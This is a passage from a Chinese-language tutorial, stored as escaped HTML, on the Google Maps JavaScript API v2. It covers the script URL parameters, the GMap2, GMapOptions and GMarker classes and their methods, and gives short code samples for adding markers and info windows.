3.hl=zh-CN&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 这个是在设定地图上除了地图图片以外的诸如控件名称、版权声明、使用提示等所需要显示文本的语言版本时候用的，假如没有指定这个参数就使用 API 的默认值，对itu.google.com 来说，默认是中文简体aps.google.com 默认的是英文。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 4. v=2&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;这个是用来指定需要导入的 API 类库的版本号，可以有四种设定方式：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;v=2.s&amp;nbsp; 稳定版本，更新最慢，但是最可靠；&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; v=2 当前版本（只用主版本号），更新速度和可靠性介于 s 和 x 之间&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; v=2.x 最新版本，更新最快，包括最新功能，可能没有当前版本可靠；&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; v=2.76 指定具体版本。不建议使用。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 注：目前谷歌地图 API的主版本号是2，当API升级时旧版本只能继续使用一个月，所以要及时更改主版本号,版本号改变会在Google Code和Maps API讨论组发布相关信息&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 5.key=abcdefg这个是设定你注册的 API 密钥.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;二：核心类：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; google地图API主要包括：地图类（GMap2）、标记类（GMarker）、标记选项类（GMarkerOptions）、折线类 （GPolyline)、经纬度（GLatLng）、命名空间（GEvent）、坐标类（GPoint）、控件的大小类GSize、 interface（GControl）、地图类型类（GMapType）、地图上面的图标类（GIcon）、窗体类（GInfoWindow）、窗体选 项类 GInfoWindowOptions）、接口GOverlay、枚举GMapPane等等&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; 注：标记和折线都是地图的覆盖物&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;1.GMap2：地图类,下面实例化一张地图：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; var map= new GMap2(container: DOM_Div,opts: Options);&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; 构造函数的参数如下：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 参数&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 是否必要&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 值类型&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 定义&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; container&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 是&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;DOM_Div&amp;nbsp;&amp;nbsp;&amp;nbsp; DOM元素，是个Div&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; opts&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 可选&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; Options&amp;nbsp;&amp;nbsp;&amp;nbsp; 构造函数选项&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; GMap2包含的方法：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1.设置状态的方法：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; enableDragging()：设置地图可以被拖动。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; disableDragging()：禁止地图被拖动。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; draggingEnabled()：返回地图是否能够被拖动的布尔值。假如能够拖动，返回&quot;真&quot;；否则返回&quot;假&quot;。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; enableInfoWindow()：设置地图信息窗口可以弹出。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; disableInfoWindow()：禁止地图信息窗口弹出。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; infoWindowEnabled()：返回地图信息窗口是否能够被弹出的布尔值。假如能够弹出，返回&quot;真&quot;；否则返回&quot;假&quot;。这个方法通常作为检验之用。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; enableDoubleClickZoom()：设置可以双击缩放地图，左键双击为放大，右键双击为缩小（默认）。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; disableDoubleClickZoom()：禁止双击缩放地图，Google Earth 默认为禁止双击缩放。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; doubleClickZoomEnabled()：返回地图是否可以双击缩放的布尔值。假如能够双击缩放，返回&quot;真&quot;；&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; enableContinuousZoom()：设置地图可以连续平滑地缩放。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; disableContinuousZoom()：禁止地图连续平滑地缩放。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; continuousZoomEnabled()：返回地图是否可以连续平滑地缩放的布尔值。假如能够连续平滑地缩放，返回&quot;真&quot;；否则返回&quot;假&quot;。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; enableScrollWheelZoom()：设置地图可以由鼠标滚轮控制缩放。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; disableScrollSheelZoom()：禁止由鼠标滚轮控制地图缩放。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; scrollWheelZoomEnabled()：返回地图缩放是否可以由鼠标滚轮控制。假如能够由鼠标滚轮控制缩放，返回&quot;真&quot;；否则返回&quot;假&quot;。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; isLoaded() 返回类型布尔值 假如地图已经被setCenter()初始化，则返回true.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;2.得到地图的数据信息方法：&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; getCenter() 返回类型GLatLng 返回地图中心点的地图坐标.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; getBounds() 返回类型GLatLngBounds 返回地图视口范围的矩形区域的地理坐标.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; getBoundsZoomLevel(bounds) 返回类型数字返回显示指定的区域需要的最适合的地图缩放等级.该缩放等级是根据当前的地图类型计算出来的，假如还没有指定地图类型,将使用地图类型数组之中的第一项.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; getSize() 返回类型GSize 返回地图视口的像素大小.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; getZoom() 返回数字 返回当前的缩放等级.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; getContainer()：取得地图的容器&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; getCurrentMapType()得到当前的地图类型。注重得到的是地图类型GMapType对象，而不是对象名称&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 3.设置地图：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; setCenter(center, zoom?, type?)将地图视图切换到指定的中心点,也可以同时设置可选的地图缩放等级和地图类型.地图类型必须已经添加到地图.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; addMapType()该方法必须在构造地图实例之后初始化地图状态时立即执行.在地图刚刚构造的时候调用地图其他的方法都将会产生错误.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; panTo(center) 设置地图的中心点到指定的坐标，假如该点已经在当前的视口之中，则地图中心会滑动到该位置.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; panBy(distance) 地图滑动指定的像素距离.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; panDirection(dx, dy) 以指定的方向滑动地图宽度一半的距离.+1代表右方和下方,-1代表左方和上方.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; setZoom(level)设置地图的缩放等级到给定值.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; zoomIn()缩小地图(将地图的缩放等级增加1).&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; zoomOut()放大地图(将地图的缩放等级减少1).&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; savePosition()保存地图当前的位置和缩放等级,以供以后通过returnToSavedPosition()方法来返回当前视图.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; returnToSavedPosition()返回到上一次通过savePosition()保存的地图视图.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; checkResize()检查地图容器(container)的大小是否已经发生变化,在地图容器DOM大小可能发生变化的时候调用该方法,以便地图能进行自动调整.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; setMapType(GMapType):设置地图类型：大概有三种类型：G_NORMAL_MAP,G_SATELLITE_MAP,G_PHYSICAL_MAP，&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; removeMapType(GMapType)从当前地图上删除一个地图类型。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; enableGoogleBar():设置地图上的搜索栏&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; &amp;nbsp;4.有关地图覆盖物的方法：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; addOverlay(overlay) 在地图上添加一个标注并触发地图的addoverlay事件.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; removeOverlay(overlay) 在地图上删除指定的标注.假如该标注确实在地图上.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; clearOverlays()删除所有地图上的标注.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 5.有关信息浮窗的方法：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; openInfoWindow(point, node, opts?)在指定的地理点打开一个简单的信息浮窗.滑动地图以保证打开的信息浮窗可见.信息浮窗的内容以DOM节点的形式给定.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; openInfoWindowHtml(point, html, opts?)在指定的地理点打开一个简单的信息浮窗.滑动地图以保证打开的信息浮窗可见.信息浮窗的内容以HTML文本的形式给定.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; openInfoWindowTabs(point, tabs, opts?)在指定的地理点打开一个分标签的信息浮窗.滑动地图以保证打开的信息浮窗可见.信息浮窗的内容以DOM节点的形式给定.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; openInfoWindowTabsHtml(point, tabs, opts?)在指定的地理点打开一个分标签的信息浮窗.滑动地图以保证打开的信息浮窗可见.信息浮窗的内容以HTML文本的形式给定.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; showMapBlowup(point, opts?)在指定的地理点打开一个显示指定点更近的视图的信息浮窗.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; closeInfoWindow()关闭当前打开的信息浮窗.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; getInfoWindow() 返回类型GInfoWindow 返回地图的信息浮窗对象.假如当前并不存在信息浮窗,则创建一个信息浮窗而不显示它.这个操作并不被enableInfoWindow()影响.&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; &amp;nbsp;6.控件的方法：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; addControl(GControl)添加一个google地图的控件&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; RemoveControl(GControl)删除一个google地图的控件&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;7. 示例：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var map = new Map2(document.getElementByIdx_x_x(&quot;map&quot;),{size:GSize(200,200), backgroundColor:&quot;#FF0000&quot;});&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;map.addControl(new GSmallMapControl());//添加一个地图左侧的缩放按钮控件&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;map.addControl(new GMapTypeControl());//添加地图类型控件包括普通地图、卫星地图、混合地图&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;map.setCenter(new GLatLng(37.4419, -122.1419), 13); //实例化一个维度为37.4419、经度为 -122.1419的经纬度实例，然后设置地图的中心。地图缩放值为13&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;// Add 10 markers in random locations on the map&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var bounds = map.getBounds();//得到地图四面的边界值&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var southWest = bounds.getSouthWest();//西南的经纬度&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var northEast = bounds.getNorthEast();//东北的经纬度&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var lngSpan = northEast.lng() - southWest.lng();//经度差&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var latSpan = northEast.lat() - southWest.lat();//维度差&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;//实例化一个在本张地图中的一个经纬度&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var point = new GLatLng(southWest.lat() + latSpan * Math.random(),&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; southWest.lng() + lngSpan * Math.random());&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; var marker = new GMarker(point);//实例化一个标点&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; //给标点加click事件，当点击标点时弹出一个信息窗&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;GEvent.addListener(marker, &quot;click&quot;, function() {&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; marker.openInfoWindowHtml(&quot;&amp;lt;b&amp;gt;hello&amp;lt;/b&amp;gt;&quot;);&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;&amp;nbsp;});&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; map.addOverlay(marker);//把标点添加到地图覆盖物&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; &amp;nbsp;2.GMapOptions类:&lt;/p&gt;\r\n&lt;p&gt;这个类型包含以下4个属性&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1.size&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 默认情况下，你创建的地图大小就是你给定的地图容器的大小，所以，通常情况下，你需要显式的声明你的地图容器的width和height属性，否则，地图 是不能正常显示的，但是，有了size这个可选属性后，你就多了一个选择了。你可以在创建地图的时候直接通过size这个属性指定地图的大小，而不需要听 命于地图容器了，即使这个地图容器已经显示的定义了width和height的大小。当然，size属性对应的值是一个GSize类型的数据，比如，假如 给定options={size:GSize(400, 300)}，那么，你所创建的地图大小就是400×300的一个 矩形块，而和你指定的容器大小无关。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; 2.mapType&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; &amp;nbsp;&amp;nbsp;创建地图后，默认显示的地图类型是普通地图，假如要加上可以选择的卫星地图、地形地图等等其他类型的地图，可以使用 GMap2.setMapType()方法，但这样往往会罗列一堆的setMapType。GMapOptions提供了mapTypes这个可选项，通 过一个数组就可以给地图加上多种支持类型，比如使用{mapTypes: [G_NORMAL_MAP,G_SATELLITE_MAP,G_PHYSICAL_MAP]}&lt;/p&gt;\r\n&lt;p&gt;，你的地图就拥有三种普通、卫星、地形三种类型了。mapTypes数组中的第一项是地图加载的默认类型，所以，假如你想默认加载卫星地图，把G_SATELLITE_MAP移到数组的第一项就可以了。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; 3.draggableCursor、draggingCursor&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 这两个选项是用来定义地图上你的光标类型，我把它们放在一起介绍不等于它们必须一起使用，你可以单独使用任何一个。其中，draggableCursor 是地图可拖拽状态（默认就是可拖拽的）下的光标，draggingCursor是拖拽地图时的光标，对应的值和你在JavaScript里面设置其他的光 标时使用的值一样，比如，&lt;/p&gt;\r\n&lt;p&gt;{draggableCursor:&quot;crosshair&quot;,draggingCursor:&quot;move&quot;}。当然，你也可以使用url形式加上你自己的图标&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; 4.backgroundColor&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 在地图图块的图片还没有传送完成之前，地图的显示区域默认会使用灰色填充，这个就是backgroundColor可以发挥作用的地方了，你可以把灰色换成其他任何符合W3C标准的颜色&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; 5.googleBarOptions&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp; 这个和你在地图上通过GMap2.enableGoogleBar()时有关系，指定你添加GoogleBar时的一些默认属性&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp; 示例：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; var options = {size:GSize(400, 300), backgroundColor:&quot;#FF0000&quot;};&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp; var map = new GMap2(document.getElementByIdx_x_x(&quot;mapContainer&quot;), options);&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;3.GMarker类&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;构造函数：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1.GMarker(point, icon?, inert?) 在指定位置point使用指定图标icon或G_DEFAULT_ICON创建一个标记.假如inert参数为true,该标记将不可点击而且没有任何参数.(2.50版本不再支持)&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2.GMarker(point, opts?) 在指定位置point使用指定的选项GMarkerOptions创建一个标记.默认标记能够点击并使用默认图标G_DEFAULT_ICON. (从 2.50开始支持)&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; &amp;nbsp;Gmarker包含的主要方法：&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 1.openInfoWindow(content, opts?) 在标记图标之上打开地图信息窗口。信息窗口的内容为 DOM 节点。仅适用于 GInfoWindowOptions.maxWidth 选项。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 2. openInfoWindowHtml(content, opts?) 在标记图标之上打开地图信息窗口。信息窗口的内容显示为包含 HTML 文本的字符串。仅适用于 GInfoWindowOptions.maxWidth 选&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;项。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 3.getIcon() GIcon 如构造函数所设置的，返回此标记的 icon。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 4.getTitle() String 如构造函数通过 GMarkerOptions.title 属性所设置的，返回此标记的标题。假如未传入标题，则返回“undefined（未定义）”（自 2.85 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 5.getPoint() GLatLng 如构造函数或 setPoint() 所设置的，返回此标记锚定的地理坐标。（自 2.88 开始建议不要使用）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 6.getLatLng() GLatLng 如构造函数或 setLatLng() 所设置的，返回此标记锚定的地理坐标。（自 2.88 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 7.setPoint(point) none 设置此标记所锚定点的地理坐标。（自 2.88 开始建议不要使用）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 8.setLatLng(point) none 设置此标记所锚定点的地理坐标。（自 2.88 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 9.enableDragging() none 答应在地图上拖拽标记。对于函数，必须已经用 GMarkerOptions.draggable = true 初始化标记。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 10.disableDragging() none 禁止在地图上拖拽标记。&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 11.draggable() Boolean 假如已使用 GMarkerOptions.draggable = true 通过构造函数对标记进行了初始化，则返回 true。否则，返回 false。&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 12.draggingEnabled() Boolean 假如当前答应用户在地图中拖拽标记，则返回 true。&amp;nbsp;&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 13.setImage(url) none 请求将 url 指定的图像设置为此标记的前景图。注：不调整打印图像和阴影图像。因此，此方法主要是为了达到高亮显示或变暗显示效果，而不是彻底改变标记的外观。（自 2.75 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 15.hide() none 假如当前标记可见，则隐藏标记。注：假如当前标记可见，则此函数会触发 GMarker.visibilitychanged 事件。（自 2.77 开始）&lt;/p&gt;\r\n&lt;p&gt;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp; 16.show() none 假如当前标记不可见，则显示标记。注：假如当前标记不可见，则此函数会触发 GMarker.visibilitychanged 事件。（自 2.77 